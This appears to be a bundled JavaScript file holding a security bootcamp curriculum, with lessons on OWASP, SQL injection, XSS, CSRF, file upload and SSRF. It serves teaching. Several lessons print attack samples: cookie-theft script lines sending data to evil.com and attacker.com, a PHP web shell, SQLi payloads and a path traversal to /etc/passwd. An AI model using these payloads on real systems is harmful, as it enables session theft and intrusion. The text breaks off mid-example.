const __vite__mapDeps=(i,m=__vite__mapDeps,d=(m.f||(m.f=["./CG_1pvN7.js","./BMVMaqUD.js","./DhEqZVGG.js"])))=>i.map(i=>d[i]);
import{d as V,v as o,A as y,_ as B}from"./Bj8b6L22.js";const g=[{number:0,title:"Introduction",theme:"Getting Started",color:"text-teal-300",bg:"bg-teal-500/10",border:"border-teal-500/20"},{number:1,title:"Week 1",theme:"Security Foundations",color:"text-indigo-300",bg:"bg-indigo-500/10",border:"border-indigo-500/20"},{number:2,title:"Week 2",theme:"Web App Security",color:"text-violet-300",bg:"bg-violet-500/10",border:"border-violet-500/20"},{number:3,title:"Week 3",theme:"Penetration Testing",color:"text-rose-300",bg:"bg-rose-500/10",border:"border-rose-500/20"},{number:4,title:"Week 4",theme:"Defensive Security",color:"text-emerald-300",bg:"bg-emerald-500/10",border:"border-emerald-500/20"},{number:5,title:"Capstone",theme:"Assessment",color:"text-amber-300",bg:"bg-amber-500/10",border:"border-amber-500/20"},{number:6,title:"Specialization",theme:"Advanced AppSec",color:"text-cyan-300",bg:"bg-cyan-500/10",border:"border-cyan-500/20"},{number:7,title:"Operations",theme:"Blue Team Practice",color:"text-sky-300",bg:"bg-sky-500/10",border:"border-sky-500/20"}],Q=40,A=["intro-1","intro-2","intro-3","intro-4"],T=[{id:"intro-1",day:1,week:0,title:"Welcome to Vindicta Academy",duration:"10 min",objectives:["Understand what Vindicta Academy is and how the bootcamp is structured","Navigate the course grid, week filters, and lesson view","Know what to expect across the 30-day curriculum"],content:`# Welcome to Vindicta Academy

## What is Vindicta Academy?

Vindicta Academy is your hands-on journey through modern security engineering. Across 30 structured lessons you will go from foundational security thinking to conducting penetration tests, reviewing code for vulnerabilities, and setting up defensive monitoring.

## Curriculum at a Glance

| Phase | Theme | Days |
|-------|-------|------|
| Week 1 | Security Foundations | 1–7 |
| Week 2 | Web App Security | 8–14 |
| Week 3 | Penetration Testing | 15–21 |
| Week 4 | Defensive Security | 22–28 |
| Capstone | Full Assessment | 29–30 |

## Anatomy of a Lesson

Every lesson contains:

**Objectives** — A short list of what you will be able to do by the end.

**Lesson content** — Explanations, code examples, tables, and real-world context. All the theory you need.

**Lab Exercise** — A practical challenge that reinforces the theory. You apply concepts in your own environment or the Academy sandbox terminal.

**Professor Vindicta** *(AI-Guided mode)* — An AI tutor who teaches the lesson interactively, asks questions to test your understanding, and awards lesson completion when you demonstrate mastery.

## How Progression Works

Lessons unlock sequentially. Complete a lesson to unlock the next one. This ensures each concept builds on solid foundations rather than jumping ahead.

The Introduction module is professor-gated too. Start with Intro 1, demonstrate understanding with Professor Vindicta, then continue through each unlocked lesson in sequence.

## Your Goal

By Day 30 you will receive a **Vindicta Security Certificate** and have the skills to apply security thinking to every system you touch.

Start the next introduction lesson to learn how to interact with Professor Vindicta and the practice terminal.`},{id:"intro-2",day:2,week:0,title:"Interacting with Professor Vindicta",duration:"10 min",objectives:["Understand the three quiz input types: multiple choice, text answer, and number","Know how lesson completion works in AI-Guided mode","Feel confident asking follow-up questions and requesting hints"],content:`# Interacting with Professor Vindicta

In AI-Guided mode you learn alongside **Professor Vindicta** — an AI tutor powered by Claude. Understanding how to communicate with the professor makes learning much faster.

## The Chat Panel

The chat panel sits to the right of the lesson content. The professor opens each lesson with an introduction, then guides you through the material using questions and explanations.

You respond by typing in the chat input and pressing **Enter** (or clicking **Send**).

## Quiz Type 1 — Multiple Choice

The professor presents labelled options:

\`\`\`
A) Confidentiality
B) Integrity
C) Availability
D) All three
\`\`\`

Click an option to select it, or type the letter (A, B, C, or D) as your response. The professor explains why the answer is correct or incorrect and continues.

## Quiz Type 2 — Text Answer

For open-ended questions ("Explain how SQL injection works") type your answer freely and press Enter. The professor evaluates the content, not the length — a concise accurate answer is better than a long vague one.

## Quiz Type 3 — Number Answer

For numeric questions ("How many bits does AES-256 use?") type only the number. The professor accepts exact or approximate answers depending on context.

## Getting Completion

The professor tracks your understanding throughout the session. When you have demonstrated sufficient mastery, the professor sends a hidden completion signal and the lesson is marked complete — unlocking the next one. The check mark appears in the course grid.

You do **not** need to answer every question perfectly. If you are stuck:
- Say "I'm not sure" and the professor will explain
- Ask "Can you give me an example?" for a concrete illustration
- Say "Let's continue" to move to the next topic
- Ask "What does that mean?" for plain-language clarification

The professor adapts to your level. The goal is understanding, not a perfect score.`,labHint:"In the chat panel, greet Professor Vindicta and ask it to give you a practice multiple choice question about cybersecurity. Answer it and see how the professor responds."},{id:"intro-3",day:3,week:0,title:"Using the Practice Terminal",duration:"15 min",objectives:["Understand what the Academy WSL sandbox is and why it is safe to experiment in","Use the terminal panel to run commands and read output","Know how professor-suggested commands work (LAB:CMD)"],content:`# Using the Practice Terminal

Some lessons pair theory with hands-on practice inside a dedicated **WSL sandbox** — a Linux environment running inside your Windows machine, isolated specifically for Academy use.

## What is WSL?

WSL (Windows Subsystem for Linux) runs a full Linux environment directly inside Windows — no virtual machine needed. Your Academy sandbox runs as a dedicated **academy** user account. You can experiment freely without affecting your main system or any other data.

## Opening the Terminal

The terminal panel appears beneath the chat when the professor activates it. You can also open it manually using the terminal icon (⬛) in the chat input bar.

\`\`\`
academy@ubuntu $ type a command here…     [▶ Run]  [↺]  [🗑]
\`\`\`

**Run** (or press **Enter**) — executes the command.
**↺ Reconnect** — re-establishes the sandbox connection if it drops.
**🗑 Clear** — clears the output panel.
**↑ / ↓ arrow keys** — navigate your command history.

## Status Indicator

A small dot in the terminal header shows sandbox status:
- 🟢 **Green** — sandbox ready
- 🔵 **Blue, pulsing** — connecting
- 🟡 **Amber** — connection issue (use Reconnect)

## Professor-Suggested Commands

The professor can pre-fill the terminal input with a suggested command. When it does, the command appears ready to run — press Enter to execute it, or edit it first.

## What the Sandbox Can Do

You can run standard Linux commands for file navigation, text processing, networking, and security tools. Common tools available include: \`nmap\`, \`curl\`, \`dig\`, \`openssl\`, \`whois\`, and more.

The sandbox runs as a non-root user. For safety, certain destructive commands are blocked.

## If WSL Is Not Configured

If WSL is not installed on your system, a setup prompt will appear. You can install WSL from the Windows Settings or run:

\`\`\`
wsl --install
\`\`\`

in PowerShell as Administrator, then restart your machine. The Academy page in Settings lets you configure which WSL distribution the sandbox uses.`,labHint:'Click the terminal icon (⬛) in the chat bar to open the terminal manually. Type `echo "Academy sandbox ready"` and press Enter. You should see your message echoed back.'},{id:"intro-4",day:4,week:0,title:"Your First Security Commands",duration:"20 min",objectives:["Run basic Linux commands in the Academy sandbox terminal","Understand what whoami, uname, ls, pwd, and echo reveal about a system","Build comfort with the terminal workflow used throughout the course"],content:`# Your First Security Commands

Security professionals live in the terminal. Most security tools — scanners, proxies, exploit frameworks — are command-line only. Even if you are primarily a developer, fluency in the terminal makes you a significantly more capable practitioner.

## The Commands You Will Run

### whoami
Prints the current user account name.

\`\`\`bash
$ whoami
academy
\`\`\`

In your sandbox this is always \`academy\`. On a compromised system, this is the first thing an attacker runs — knowing who you are determines what you can access.

### uname -a
Prints system information: kernel version, hostname, architecture, and OS.

\`\`\`bash
$ uname -a
Linux hostname 5.15.0 #1 SMP x86_64 GNU/Linux
\`\`\`

Knowing the kernel version is critical for finding privilege escalation exploits.

### pwd
Print Working Directory — shows your current location in the filesystem.

\`\`\`bash
$ pwd
/home/academy
\`\`\`

### ls -la ~
Lists all files (including hidden ones) in your home directory.

\`\`\`bash
$ ls -la ~
drwxr-xr-x  .
drwxr-xr-x  ..
-rw-------  .bash_history
-rw-r--r--  .bashrc
\`\`\`

The \`-la\` flags show hidden files (\`-a\`) and detailed permission info (\`-l\`). Attackers always check for hidden configuration files that may contain credentials or history.

### echo "Hello, Security!"
Prints a message to the terminal. Simple, but fundamental — echo is used everywhere in scripts to show status messages and debug values.

\`\`\`bash
$ echo "Hello, Security!"
Hello, Security!
\`\`\`

## Why These Commands?

These five commands answer the first questions any attacker asks after gaining access to a system: *Who am I? What OS is this? Where am I? What files are here?* Learning them from the defender's perspective — understanding what an attacker sees — is the foundation of effective security thinking.`,labHint:'Run all five commands: whoami, uname -a, pwd, ls -la ~, and echo "Hello, Security!". Share the output in the chat and the professor will explain what an attacker could infer from each result.'},{id:"day-1",day:1,week:1,title:"The Security Mindset",duration:"45 min",objectives:["Understand the CIA Triad: Confidentiality, Integrity, Availability","Think like an attacker to build better defenses","Recognize the difference between security and compliance"],content:`# Day 1 — The Security Mindset

## The CIA Triad

Every security decision maps back to three fundamental properties:

**Confidentiality** — data is accessible only to authorised parties. Encryption, access controls, and least privilege protect this.

**Integrity** — data is accurate and unaltered. Checksums, digital signatures, and audit logs enforce this.

**Availability** — systems and data are accessible when needed. Redundancy, backups, and DDoS protection support this.

Attacks almost always target one or more of these. A ransomware attack destroys all three. A SQL injection primarily threatens confidentiality and integrity. A DoS attack targets availability alone.

## Thinking Like an Attacker

Good defenders think offensively. Before building a feature, ask:
- How could this be abused?
- What's the worst-case input an attacker could send?
- What happens if the system next to this one is compromised?

This adversarial mindset is the foundation of **threat modeling** — which you'll learn tomorrow.

## Security ≠ Compliance

Compliance means meeting a checklist (PCI-DSS, GDPR, SOC 2). Security means actually being resilient against attack. You can be compliant and still be breached, or secure and technically non-compliant. Chase security; compliance often follows.

## Key Principle: Defence in Depth

No single control is perfect. Layer multiple controls so that when one fails, another catches the threat. A locked door, an alarm, and a camera are more effective than any one alone.`,labHint:"Think of a feature you built recently. List 3 ways an attacker could abuse it. No code needed — just adversarial thinking."},{id:"day-2",day:2,week:1,title:"Threat Modeling (STRIDE)",duration:"60 min",objectives:["Apply the STRIDE framework to identify threats","Create a basic data flow diagram for threat analysis","Prioritise threats using DREAD or risk scoring"],content:`# Day 2 — Threat Modeling with STRIDE

## What is Threat Modeling?

Threat modeling is a structured process for identifying security threats before you write a line of code. It answers: *What can go wrong? How bad would it be? What should we do about it?*

## The STRIDE Framework

Microsoft's STRIDE is the most widely used threat categorization system:

| Letter | Threat | Violated Property |
|--------|--------|-------------------|
| S | Spoofing | Authentication |
| T | Tampering | Integrity |
| R | Repudiation | Non-repudiation |
| I | Information Disclosure | Confidentiality |
| D | Denial of Service | Availability |
| E | Elevation of Privilege | Authorization |

**Spoofing**: Pretending to be someone else. Example: forging a session cookie to impersonate another user.

**Tampering**: Modifying data in transit or at rest. Example: changing an order total by intercepting an API call.

**Repudiation**: Denying an action was taken. Example: claiming you never initiated a wire transfer when logs are insufficient.

**Information Disclosure**: Exposing private data. Example: verbose error messages leaking database schema.

**Denial of Service**: Making a system unavailable. Example: flooding login endpoints to lock out users.

**Elevation of Privilege**: Gaining more access than authorised. Example: a regular user accessing admin endpoints.

## Building a Data Flow Diagram

A DFD shows how data moves through your system:
1. **External entities** — users, external services (squares)
2. **Processes** — your application logic (circles)
3. **Data stores** — databases, caches (parallel lines)
4. **Data flows** — arrows connecting the above

Apply STRIDE to each element and data flow. Every trust boundary crossing is a priority threat surface.

## Prioritising with DREAD

Score each threat 1-10 across: Damage, Reproducibility, Exploitability, Affected users, Discoverability. Sum the scores to rank threats.`,labHint:"Draw a DFD for a simple login system: browser → API → database. Apply STRIDE to the trust boundaries and identify your top 3 threats."},{id:"day-3",day:3,week:1,title:"OWASP Top 10 — Part 1",duration:"60 min",objectives:["Understand the first five OWASP Top 10 categories (2021)","Recognise vulnerable code patterns for each category","Apply basic mitigations for injection, broken auth, and XSS"],content:`# Day 3 — OWASP Top 10 (Part 1)

The OWASP Top 10 is the industry standard reference for critical web app security risks, updated every few years based on real-world breach data.

## A01: Broken Access Control

The most common critical flaw. Users access resources or functions beyond their permissions.

**Example**: Changing \`/api/orders/1234\` to \`/api/orders/1235\` and seeing another user's order (IDOR — Insecure Direct Object Reference).

**Mitigation**: Enforce authorization server-side on every request. Never trust client-supplied IDs without checking ownership.

## A02: Cryptographic Failures

Using weak or absent encryption for sensitive data.

**Example**: Storing passwords as MD5 hashes (trivially reversed with rainbow tables), or transmitting credit card numbers over HTTP.

**Mitigation**: Use bcrypt/Argon2 for passwords. TLS 1.2+ for all data in transit. AES-256 for sensitive data at rest.

## A03: Injection

Attacker-controlled data interpreted as commands. SQL injection is the classic example.

**Vulnerable code** (Python):
\`\`\`python
query = "SELECT * FROM users WHERE name = '" + username + "'"
\`\`\`

If \`username\` is \`' OR 1=1 --\`, the query returns all rows.

**Mitigation**: Use parameterised queries / prepared statements. Never concatenate user input into SQL.

## A04: Insecure Design

Fundamental design flaws that no amount of implementation can fix. Example: a password reset flow that relies on security questions (easily guessable from social media).

**Mitigation**: Threat model during design. Use secure design patterns from the start.

## A05: Security Misconfiguration

Default credentials left unchanged, unnecessary features enabled, verbose error messages in production.

**Example**: Leaving AWS S3 buckets public, or running a database with no authentication.

**Mitigation**: Harden every layer. Disable defaults. Automate configuration checks in CI/CD.`,labHint:'Find a SQL injection vulnerability in this snippet and write the parameterised fix: `db.query("SELECT * FROM products WHERE id=" + req.params.id)`'},{id:"day-4",day:4,week:1,title:"OWASP Top 10 — Part 2",duration:"60 min",objectives:["Understand OWASP A06-A10: outdated components, auth failures, integrity issues, logging, and SSRF","Identify vulnerable dependency patterns","Configure basic security logging"],content:`# Day 4 — OWASP Top 10 (Part 2)

## A06: Vulnerable and Outdated Components

Using libraries, frameworks, or OS components with known CVEs.

**Example**: Running Log4j 2.14 (Log4Shell) or an old version of OpenSSL with Heartbleed. A single vulnerable dependency can expose your entire application.

**Mitigation**: Audit dependencies regularly (npm audit, pip-audit, OWASP Dependency-Check). Pin versions and update promptly when CVEs are published.

## A07: Identification and Authentication Failures

Weak session management, missing brute-force protection, poor password policies.

**Example**: Session tokens that don't expire, allowing an attacker to reuse a stolen cookie indefinitely.

**Mitigation**: Use strong, random session IDs. Implement MFA. Rate-limit login attempts. Invalidate sessions on logout.

## A08: Software and Data Integrity Failures

CI/CD pipelines or update mechanisms that don't verify integrity of software components.

**Example**: A build pipeline that downloads dependencies over HTTP without checksums — an attacker who controls the network can inject malware.

**Mitigation**: Use HTTPS for all dependency downloads. Verify checksums (npm lock files, pip hash checking). Sign release artifacts.

## A09: Security Logging and Monitoring Failures

Insufficient logging means breaches go undetected for months (average: 277 days to discovery without good logging).

**What to log**:
- All authentication events (success and failure)
- Access control failures
- Input validation failures
- High-value transactions

**Mitigation**: Centralise logs. Alert on anomalies. Protect logs from tampering.

## A10: Server-Side Request Forgery (SSRF)

The application fetches a URL controlled by the attacker, allowing access to internal services.

**Example**: An image-upload feature that accepts a URL. An attacker submits \`http://169.254.169.254/latest/meta-data/\` to steal AWS instance credentials.

**Mitigation**: Validate and allowlist URLs. Block requests to internal IP ranges. Use cloud metadata endpoint protection.`,labHint:"Run `npm audit` on any project. Identify one High or Critical vulnerability and find the patch version."},{id:"day-5",day:5,week:1,title:"Cryptography Fundamentals",duration:"75 min",objectives:["Distinguish symmetric vs asymmetric encryption and their use cases","Understand hashing and why salts matter for passwords","Explain how TLS/HTTPS works at a high level"],content:`# Day 5 — Cryptography Fundamentals

## Symmetric Encryption

The same key encrypts and decrypts. Fast, suitable for large data.

**AES-256** is the current standard for symmetric encryption. Used for: database encryption, file encryption, disk encryption.

**Problem**: How do you securely share the key? This is the *key distribution problem*.

## Asymmetric Encryption

Two mathematically related keys: a public key (shared freely) and a private key (kept secret). Data encrypted with the public key can only be decrypted with the private key.

**RSA** and **Elliptic Curve** (ECDSA, X25519) are the standard algorithms.

**Use cases**: TLS handshakes, digital signatures, SSH keys, email encryption (PGP).

## Hashing

A one-way function: given input X, always produces the same output hash H. You cannot reverse H to get X.

**Do NOT use**: MD5, SHA-1 (broken, fast — brute-forceable).

**For general integrity**: SHA-256, SHA-3.

**For passwords**: bcrypt, scrypt, Argon2 — deliberately slow to resist brute force.

## Salts and Password Storage

A **salt** is random data added to a password before hashing. This ensures two users with the same password get different hashes, defeating rainbow table attacks.

\`\`\`
stored = bcrypt.hash(password + random_salt)
// Salt is stored alongside the hash
\`\`\`

**Never** store plain text passwords. **Never** use fast hashes (MD5/SHA1) for passwords.

## How TLS Works

1. Client connects, sends supported cipher suites.
2. Server sends its certificate (containing public key), signed by a trusted CA.
3. Client verifies the certificate chain up to a root CA it trusts.
4. Both sides perform a key exchange (ECDH) to derive a shared symmetric session key.
5. All further communication is encrypted with that session key (AES-GCM).

TLS 1.3 (2018) removed weak cipher suites and simplified the handshake — require it where possible.`,labHint:'Generate a bcrypt hash of "hello123" with rounds=12 using an online tool or Node.js bcryptjs. Note how the hash changes each time despite the same input (salt in action).'},{id:"day-6",day:6,week:1,title:"Network Security Fundamentals",duration:"60 min",objectives:["Understand TCP/IP layers and where attacks occur at each layer","Read a basic nmap scan output","Configure firewall rules using least-privilege principles"],content:`# Day 6 — Network Security Fundamentals

## The OSI & TCP/IP Models

Security threats exist at every network layer:

| Layer | Name | Example Attacks |
|-------|------|-----------------|
| L7 | Application | XSS, SQL injection, API abuse |
| L4 | Transport | TCP SYN flood, session hijacking |
| L3 | Network | IP spoofing, routing attacks |
| L2 | Data Link | ARP spoofing, VLAN hopping |
| L1 | Physical | Cable tapping, rogue access points |

## Port Scanning with Nmap

Nmap is the industry-standard network scanner. Basic usage:

\`\`\`bash
nmap -sV -sC -p- target.com
\`\`\`

- \`-sV\` — version detection (what service is running on each port?)
- \`-sC\` — run default scripts
- \`-p-\` — scan all 65535 ports (not just top 1000)

**Reading output**:
\`\`\`
22/tcp   open  ssh     OpenSSH 8.9
80/tcp   open  http    nginx 1.24
3306/tcp open  mysql   MySQL 8.0.33
\`\`\`

Port 3306 (MySQL) open on a public-facing server is almost always a misconfiguration. Databases should never be directly reachable from the internet.

## Firewall Principles

**Default deny**: Block everything, then explicitly allow what's needed. The opposite (default allow, block specific things) is far less secure.

**Least privilege**: Each service should only be reachable from the hosts that need it. Your API server doesn't need direct internet access to port 5432 (PostgreSQL).

**Stateful inspection**: Modern firewalls track connection state. A response packet to an outbound request is allowed; an unsolicited inbound packet to the same port is blocked.

## Common Attack Types

**Man-in-the-Middle (MITM)**: Intercepting traffic between two parties. Mitigated by TLS with certificate validation.

**ARP Spoofing**: Poisoning the ARP cache to redirect LAN traffic. Mitigated by dynamic ARP inspection on managed switches.

**DNS Spoofing**: Returning malicious IP for a domain lookup. Mitigated by DNSSEC.`,labHint:"If you have WSL or Linux available: run `nmap -sV localhost` and identify which services are exposed on your own machine."},{id:"day-7",day:7,week:1,title:"Linux Security Fundamentals",duration:"60 min",objectives:["Navigate Linux file permissions and ownership","Harden a basic Linux server (users, SSH, services)","Understand sudo, setuid, and privilege escalation vectors"],content:`# Day 7 — Linux Security Fundamentals

## File Permissions

Linux permissions are expressed as \`rwxrwxrwx\` (owner / group / others):

\`\`\`
-rw-r--r-- 1 alice dev 1234 May 1 config.yml
\`\`\`

- Owner (alice): read + write
- Group (dev): read only
- Others: read only

**Key commands**:
\`\`\`bash
chmod 640 secret.key    # rw-r----- (owner rw, group r, others none)
chown root:root /etc/shadow
find / -perm -4000 2>/dev/null  # Find setuid binaries
\`\`\`

## The setuid Bit

A binary with the setuid bit runs with the **owner's** privileges, not the caller's. If root owns a setuid binary, any user who runs it gets root-level execution.

Legitimate examples: \`passwd\`, \`ping\`. Every unexplained setuid binary is a potential privilege escalation.

## SSH Hardening

Edit \`/etc/ssh/sshd_config\`:

\`\`\`
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AllowUsers alice bob
Protocol 2
\`\`\`

Disable root login. Force key-based auth. Restrict which users can log in. Restart sshd after changes.

## Minimal Attack Surface

- Remove unused services: \`systemctl disable --now apache2\`
- Remove unused packages: \`apt purge telnet ftp rsh\`
- Enable automatic security updates: \`unattended-upgrades\`
- Run services as non-root users with their own accounts

## Audit Tools

- **Lynis**: \`lynis audit system\` — comprehensive hardening check
- **chkrootkit / rkhunter**: Scan for rootkits
- **auditd**: Kernel-level system call auditing`,labHint:"In your WSL terminal: run `find / -perm -4000 2>/dev/null` to list setuid binaries. Research what each one does and why it needs setuid."},{id:"day-8",day:8,week:2,title:"HTTP Security Deep Dive",duration:"60 min",objectives:["Understand HTTP request/response structure from a security perspective","Configure essential security headers (CSP, HSTS, X-Frame-Options)","Use browser DevTools to inspect security headers"],content:`# Day 8 — HTTP Security Deep Dive

## The HTTP Request Anatomy

Every web request has: method, URL, headers, and optional body. Attackers manipulate every part.

**Security-sensitive headers**:
- \`Cookie\` — session tokens (should be HttpOnly, Secure, SameSite)
- \`Authorization\` — Bearer tokens, Basic auth
- \`Origin\` / \`Referer\` — used in CSRF validation
- \`Content-Type\` — affects how servers parse bodies

## Essential Response Security Headers

**Strict-Transport-Security (HSTS)**:
\`\`\`
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
\`\`\`
Forces HTTPS for one year. Add to HSTS preload list to prevent first-visit MITM.

**Content-Security-Policy (CSP)**:
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
\`\`\`
Restricts which resources can be loaded. One of the most powerful XSS mitigations.

**X-Frame-Options**:
\`\`\`
X-Frame-Options: DENY
\`\`\`
Prevents clickjacking by blocking your page from being embedded in an iframe.

**X-Content-Type-Options**:
\`\`\`
X-Content-Type-Options: nosniff
\`\`\`
Prevents browsers from MIME-sniffing a response (e.g., serving a JPEG that contains HTML).

**Referrer-Policy**:
\`\`\`
Referrer-Policy: strict-origin-when-cross-origin
\`\`\`
Controls how much referrer info is sent with cross-origin requests.

## CORS (Cross-Origin Resource Sharing)

The browser's same-origin policy blocks JS on \`evil.com\` from reading responses from \`bank.com\`. CORS allows servers to opt-in to cross-origin requests.

**Dangerous misconfiguration**:
\`\`\`
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
\`\`\`
This allows any site to make authenticated requests — effectively disabling the same-origin policy.

**Safe configuration**: Only allowlist specific known origins, never use \`*\` with credentials.`,labHint:"Visit https://securityheaders.com and scan your own domain or any public site. Note which headers are missing and what grade it receives."},{id:"day-9",day:9,week:2,title:"SQL Injection — Theory & Exploitation",duration:"75 min",objectives:["Explain the mechanics of SQL injection at the query level","Identify and exploit basic SQLi in a test environment","Write parameterised queries in Node.js, Python, and PHP"],content:`# Day 9 — SQL Injection Deep Dive

## How SQLi Works

SQL injection occurs when user input is concatenated directly into a SQL query without sanitisation.

**Vulnerable PHP**:
\`\`\`php
$query = "SELECT * FROM users WHERE email = '" . $_POST['email'] . "'";
\`\`\`

Attacker sends: \`admin@example.com' --\`

Resulting query: \`SELECT * FROM users WHERE email = 'admin@example.com' --'\`

The \`--\` comments out the rest of the query. If the application logs in the first returned user, the attacker is now authenticated as admin.

## Types of SQLi

**In-band SQLi** (most common):
- **Error-based**: Database error messages reveal schema information
- **Union-based**: \`UNION SELECT username, password FROM users --\` appends data to the result set

**Blind SQLi** (no visible output):
- **Boolean-based**: Send two queries; one should return data, one shouldn't. Different responses reveal true/false
- **Time-based**: \`; WAITFOR DELAY '0:0:5' --\` (SQL Server) — if response is slow, condition is true

**Out-of-band SQLi**: Data exfiltrated via DNS or HTTP requests from the database server.

## The Fix: Parameterised Queries

**Node.js (mysql2)**:
\`\`\`javascript
const [rows] = await conn.execute(
  'SELECT * FROM users WHERE email = ?',
  [req.body.email]
);
\`\`\`

**Python (psycopg2)**:
\`\`\`python
cur.execute('SELECT * FROM users WHERE email = %s', (email,))
\`\`\`

The database driver handles escaping. User input is never interpreted as SQL.

## Additional Mitigations

- **Least privilege**: The database user should only have SELECT/INSERT/UPDATE on the tables it needs — never DROP or admin access
- **WAF**: Web Application Firewalls add a layer but are not a substitute for parameterised queries
- **Error handling**: Never expose database error messages to users in production`,labHint:"Try the DVWA (Damn Vulnerable Web App) SQL injection challenges at low security level. Identify the vulnerable parameter, then fix it with a parameterised query."},{id:"day-10",day:10,week:2,title:"Cross-Site Scripting (XSS)",duration:"75 min",objectives:["Distinguish reflected, stored, and DOM-based XSS","Exploit XSS to steal a session cookie in a test environment","Implement output encoding and CSP to mitigate XSS"],content:`# Day 10 — Cross-Site Scripting (XSS)

## What is XSS?

XSS allows attackers to inject malicious scripts into web pages viewed by other users. The browser executes the script in the context of the vulnerable site, giving the attacker full access to: cookies, localStorage, DOM, and the ability to make authenticated requests.

## Three Types of XSS

**Reflected XSS**: The payload is in the request and reflected immediately in the response.
\`\`\`
https://example.com/search?q=<script>alert(1)<\/script>
\`\`\`
The server includes the query param in the HTML response without encoding. Requires tricking a victim into clicking a crafted link.

**Stored XSS**: The payload is stored in the database and executed whenever a user views the affected page.

Example: A comment field that allows \`<script>document.location='https://evil.com?c='+document.cookie<\/script>\`. Every user who views that comment sends their cookies to the attacker.

**DOM-based XSS**: The vulnerability is in client-side JavaScript, not the server response.
\`\`\`javascript
// Vulnerable
document.getElementById('output').innerHTML = location.hash.slice(1)
\`\`\`
If \`location.hash\` is \`#<img src=x onerror=alert(1)>\`, the script executes without the server being involved.

## Cookie Theft Example

\`\`\`javascript
new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie)
\`\`\`

This fires silently. If cookies lack the \`HttpOnly\` flag, they're exposed to JavaScript and stealable.

## Mitigations

**Output Encoding**: Encode user-controlled data before inserting into HTML.
\`\`\`javascript
// Instead of innerHTML, use textContent (safe):
el.textContent = userInput
// Or encode: < → &lt;  > → &gt;  " → &quot;
\`\`\`

**HttpOnly Cookies**: Prevents JavaScript from reading session cookies — stolen even if XSS fires.

**Content-Security-Policy**: A strong CSP can block inline script execution and restrict where scripts load from.

**DOMPurify**: For cases where HTML input is necessary (rich text editors), use a sanitisation library.`,labHint:"Set up DVWA or use XSS game (xss-game.appspot.com) to find and exploit a reflected XSS. Then fix it by properly encoding the output."},{id:"day-11",day:11,week:2,title:"CSRF & Session Management",duration:"60 min",objectives:["Explain how CSRF attacks abuse browser authentication","Implement CSRF tokens and SameSite cookies","Design secure session lifecycle management"],content:`# Day 11 — CSRF & Session Security

## Cross-Site Request Forgery (CSRF)

CSRF tricks a logged-in user's browser into making an unwanted request to a target site. The browser automatically includes cookies, so the request appears legitimate.

**Attack scenario**:
1. Alice is logged into \`bank.com\`
2. Alice visits \`evil.com\` which contains:
\`\`\`html
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
\`\`\`
3. Alice's browser requests that URL with her session cookie
4. The bank processes the transfer

## Why It Works

The browser's same-origin policy prevents \`evil.com\` from *reading* the response, but it doesn't prevent *sending* the request with credentials.

## Mitigation 1: CSRF Tokens

Generate a random, secret, per-session token. Include it in every state-changing form/request. Validate it server-side.

\`\`\`html
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
  ...
</form>
\`\`\`

An attacker on \`evil.com\` cannot read the token (SOP blocks it), so their forged request fails validation.

## Mitigation 2: SameSite Cookies

\`\`\`
Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly
\`\`\`

- \`SameSite=Strict\`: Cookie is never sent with cross-site requests
- \`SameSite=Lax\` (browser default for new cookies): Cookie sent on top-level navigation but not AJAX/img
- \`SameSite=None\`: Required for cross-site cookies (must also be Secure)

## Session Lifecycle

- **Generation**: Use cryptographically random IDs (128+ bits). Never derive session IDs from predictable data.
- **Transmission**: HTTPS only. HttpOnly and Secure flags.
- **Expiration**: Set absolute timeout (24h) and idle timeout (30min). Regenerate session ID on privilege change (login, sudo).
- **Termination**: Delete server-side session on logout, not just the cookie.`,labHint:"Identify whether your last project's forms include CSRF tokens. Check the SameSite attribute of session cookies in DevTools > Application > Cookies."},{id:"day-12",day:12,week:2,title:"File Upload & Path Traversal",duration:"60 min",objectives:["Identify dangerous file upload patterns and exploit them safely","Understand path traversal and directory escape attacks","Implement secure file upload handling"],content:`# Day 12 — File Upload & Path Traversal

## File Upload Vulnerabilities

A file upload feature is one of the most dangerous inputs to handle. Attackers aim to:
1. Upload a web shell (executable server-side code)
2. Upload an XSS payload (malicious HTML/SVG)
3. Overwrite existing files

**Vulnerable pattern**:
\`\`\`javascript
app.post('/upload', (req, res) => {
  const file = req.files.upload
  file.mv('/var/www/uploads/' + file.name)  // Dangerous!
})
\`\`\`

An attacker uploads \`shell.php\` containing \`<?php system($_GET['cmd']); ?>\`. The server saves it in the web root and it's directly accessible at \`/uploads/shell.php?cmd=id\`.

## Secure File Upload

1. **Validate type by content, not extension**: Read the file's magic bytes (first few bytes), not just the filename extension. Use a library like \`file-type\` in Node.js.
2. **Rename files**: Never use the user-supplied filename. Generate a UUID.
3. **Store outside web root**: Save uploads to a non-public directory. Serve them through an API that sets \`Content-Disposition: attachment\`.
4. **Restrict by size**: Always enforce max file size.
5. **Scan for malware**: Use ClamAV or an API to scan before storing.

## Path Traversal

When user input influences file paths without sanitisation.

**Vulnerable**:
\`\`\`javascript
const data = fs.readFileSync('/app/files/' + req.query.name)
\`\`\`

Attacker sends: \`?name=../../etc/passwd\`

The path resolves to \`/etc/passwd\` — exposing system files.

**Fix**:
\`\`\`javascript
const base = '/app/files'
const requested = path.resolve(base, req.query.name)
// Ensure the resolved path starts with the base directory
if (!requested.startsWith(base + path.sep)) {
  return res.status(403).send('Forbidden')
}
\`\`\``,labHint:'Build a minimal file upload form. Try uploading: (1) a PHP file, (2) a file named "../../test.txt", (3) an SVG with embedded JavaScript. Then apply each mitigation.'},{id:"day-13",day:13,week:2,title:"SSRF & XXE Attacks",duration:"60 min",objectives:["Explain Server-Side Request Forgery and its impact","Understand XML External Entity injection","Implement URL validation to prevent SSRF"],content:`# Day 13 — SSRF & XXE

## Server-Side Request Forgery (SSRF)

SSRF forces the server to make requests on the attacker's behalf. This is dangerous because:
- The server has access to internal network services (databases, metadata APIs)
- Requests appear to come from a trusted source
- Internal services often have weaker authentication

**Classic SSRF on cloud**:
AWS EC2 instances expose instance metadata at \`http://169.254.169.254/\`. An SSRF vulnerability lets an attacker retrieve IAM credentials with full cloud account access.

**Attack**:
\`\`\`
POST /api/fetch-preview
